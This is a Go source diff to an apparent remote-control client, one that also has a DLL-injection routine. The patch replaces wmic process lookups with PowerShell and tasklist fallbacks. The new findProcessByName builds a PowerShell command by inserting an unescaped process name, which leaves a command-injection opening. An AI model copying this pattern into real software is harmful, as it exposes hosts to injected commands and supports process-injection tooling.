@@ -1783,8 +1783,48 @@ func (c *Client) listUploads() string {
 }
 
 func (c *Client) listProcesses() string {
-	cmd := exec.Command("wmic", "process", "get", "name,processid,parentprocessid", "/format:csv")
+	// Try PowerShell first (more reliable than wmic)
+	// Format output as simple CSV: Name,Id,ParentProcessId
+	psCommand := `Get-Process | ForEach-Object { 
+		$parent = if ($_.Parent) { $_.Parent.Id } else { "0" }
+		"$($_.Name),$($_.Id),$parent"
+	}`
+	cmd := exec.Command("powershell", "-Command", psCommand)
 	output, err := cmd.CombinedOutput()
+	if err == nil && len(strings.TrimSpace(string(output))) > 0 {
+		// Add header for consistent parsing
+		result := "Name,Id,ParentProcessId\n" + string(output)
+		return result
+	}
+
+	// Fallback to tasklist if PowerShell fails
+	cmd = exec.Command("tasklist", "/fo", "csv", "/nh")
+	output, err = cmd.CombinedOutput()
+	if err == nil && len(strings.TrimSpace(string(output))) > 0 {
+		// Parse tasklist output and convert to our format
+		lines := strings.Split(string(output), "\n")
+		var result strings.Builder
+		result.WriteString("Name,Id,ParentProcessId\n")
+
+		for _, line := range lines {
+			line = strings.TrimSpace(line)
+			if line == "" {
+				continue
+			}
+			// Parse CSV line from tasklist
+			parts := strings.Split(line, "\",\"")
+			if len(parts) >= 2 {
+				name := strings.Trim(parts[0], "\"")
+				pid := strings.Trim(parts[1], "\"")
+				result.WriteString(fmt.Sprintf("%s,%s,0\n", name, pid))
+			}
+		}
+		return result.String()
+	}
+
+	// Last resort: try wmic for older systems
+	cmd = exec.Command("wmic", "process", "get", "name,processid,parentprocessid", "/format:csv")
+	output, err = cmd.CombinedOutput()
 	if err != nil {
 		return fmt.Sprintf("Failed to list processes: %v", err)
 	}
@@ -1823,10 +1863,45 @@ func (c *Client) executeDllInject(targetProcess, dllPath string) string {
 }
 
 func (c *Client) findProcessByName(processName string) (uint32, error) {
-	cmd := exec.Command("wmic", "process", "where", fmt.Sprintf("name='%s'", processName), "get", "processid", "/value")
+	// Try PowerShell first (more reliable than wmic)
+	psCommand := fmt.Sprintf(`Get-Process -Name "%s" -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty Id`,
+		strings.TrimSuffix(processName, ".exe"))
+	cmd := exec.Command("powershell", "-Command", psCommand)
 	output, err := cmd.CombinedOutput()
+	if err == nil {
+		outputStr := strings.TrimSpace(string(output))
+		if outputStr != "" {
+			if pid, err := strconv.ParseUint(outputStr, 10, 32); err == nil && pid > 0 {
+				return uint32(pid), nil
+			}
+		}
+	}
+
+	// Fallback to tasklist if PowerShell fails
+	cmd = exec.Command("tasklist", "/fi", fmt.Sprintf("imagename eq %s", processName), "/fo", "csv", "/nh")
+	output, err = cmd.CombinedOutput()
+	if err == nil {
+		lines := strings.Split(string(output), "\n")
+		for _, line := range lines {
+			line = strings.TrimSpace(line)
+			if strings.Contains(line, processName) {
+				// Parse CSV format: "name","pid","session","session#","mem usage"
+				parts := strings.Split(line, "\",\"")
+				if len(parts) >= 2 {
+					pidStr := strings.Trim(parts[1], "\"")
+					if pid, err := strconv.ParseUint(pidStr, 10, 32); err == nil && pid > 0 {
+						return uint32(pid), nil
+					}
+				}
+			}
+		}
+	}
+
+	// Last resort: try wmic for older systems
+	cmd = exec.Command("wmic", "process", "where", fmt.Sprintf("name='%s'", processName), "get", "processid", "/value")
+	output, err = cmd.CombinedOutput()
 	if err != nil {
-		return 0, err
+		return 0, fmt.Errorf("process not found: %v", err)
 	}
 
 	lines := strings.Split(string(output), "\n")
